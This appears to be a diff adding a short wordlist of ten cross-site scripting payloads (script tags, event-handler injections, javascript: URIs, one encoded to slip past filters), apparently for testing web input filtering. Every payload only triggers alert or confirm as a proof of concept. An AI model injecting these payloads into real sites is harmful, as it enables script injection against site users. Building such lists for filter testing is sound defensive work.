@@ -1,0 +1,10 @@
+<script>alert(1)</script>
+"><svg/onload=alert(1)>
+'><img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src='javascript:alert(1)'>
+<math><mtext></mtext><script>alert(1)</script>
+<img src=x onerror=confirm(1)>
+<video><source onerror="alert(1)"></video>
+<a href='javas&#99;ript:alert(1)'>Click</a>
+<input onfocus=alert(1) autofocus>
